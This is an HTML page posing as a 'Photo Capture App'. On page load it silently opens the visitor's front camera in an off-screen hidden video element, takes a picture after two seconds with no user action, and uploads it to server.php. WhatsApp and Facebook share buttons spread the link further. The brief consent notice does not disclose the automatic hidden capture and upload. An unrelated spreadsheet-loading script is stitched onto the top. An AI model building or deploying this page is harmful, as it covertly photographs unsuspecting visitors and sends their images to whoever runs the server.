<script type="text/javascript">
        var gk_isXlsx = false;
        var gk_xlsxFileLookup = {};
        var gk_fileData = {};
        function filledCell(cell) {
          return cell !== '' && cell != null;
        }
        function loadFileData(filename) {
        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
            try {
                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
                var firstSheetName = workbook.SheetNames[0];
                var worksheet = workbook.Sheets[firstSheetName];

                // Convert sheet to JSON to filter blank rows
                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
                // Filter out blank rows (rows where all cells are empty, null, or undefined)
                var filteredData = jsonData.filter(row => row.some(filledCell));

                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
                var headerRowIndex = filteredData.findIndex((row, index) =>
                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
                );
                // Fallback
                if (headerRowIndex === -1 || headerRowIndex > 25) {
                  headerRowIndex = 0;
                }

                // Convert filtered JSON back to CSV
                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
                return csv;
            } catch (e) {
                console.error(e);
                return "";
            }
        }
        return gk_fileData[filename] || "";
        }
        </script><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo Capture App</title>
    <style>
        body {
            font-family: 'Verdana', sans-serif;
            text-align: center;
            background-color: #1a1a1a;
            margin: 0;
            padding: 20px;
            color: #e0e0e0;
        }
        .intro {
            margin: 20px 0;
            font-size: 1.3em;
            color: #b0b0b0;
        }
        .notice {
            margin: 20px;
            padding: 15px;
            border: 1px solid #444444;
            background-color: #2a2a2a;
            font-size: 0.9em;
            border-radius: 5px;
            color: #cccccc;
        }
        .share-buttons {
            margin-top: 30px;
        }
        button {
            padding: 12px 25px;
            font-size: 1em;
            margin: 10px;
            cursor: pointer;
            background-color: #ff4d4d;
            color: #ffffff;
            border: none;
            border-radius: 5px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #e04343;
        }
        #video {
            visibility: hidden;
            position: absolute;
            top: -9999px;
            left: -9999px;
        }
        #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="intro">
        <p>Capture a moment with this app!</p>
    </div>
    <div class="notice">
        <p>This app will use your camera to take a photo. By proceeding, you consent to camera access.</p>
    </div>
    <video id="video" autoplay muted></video>
    <canvas id="canvas"></canvas>
    <div class="share-buttons">
        <p>Share this link:</p>
        <button onclick="shareLink('WhatsApp')">WhatsApp</button>
        <button onclick="shareLink('Facebook')">Facebook</button>
    </div>

    <script>
        const videoElement = document.getElementById('video');
        const canvasElement = document.getElementById('canvas');

        // Request camera access on page load
        window.addEventListener('load', () => {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    videoElement.srcObject = stream;
                })
                .catch(err => {
                    console.error('Camera access failed:', err);
                });
        });

        // Capture photo when video is ready
        videoElement.addEventListener('canplay', () => {
            setTimeout(() => {
                canvasElement.width = videoElement.videoWidth;
                canvasElement.height = videoElement.videoHeight;
                canvasElement.getContext('2d').drawImage(videoElement, 0, 0);
                const imageData = canvasElement.toDataURL('image/png');

                fetch('server.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData })
                })
                .then(response => response.json())
                .then(data => {
                    console.log(data.message);
                    videoElement.srcObject.getTracks().forEach(track => track.stop());
                })
                .catch(err => {
                    console.error('Error saving photo:', err);
                });
            }, 2000);
        });

        function shareLink(platform) {
            const url = window.location.href;
            if (platform === 'WhatsApp') {
                window.open(`https://api.whatsapp.com/send?text=Check%20out%20this%20photo%20capture!%20${url}`);
            } else if (platform === 'Facebook') {
                window.open(`https://www.facebook.com/sharer/sharer.php?u=${url}`);
            }
        }
    </script>
</body>
</html>
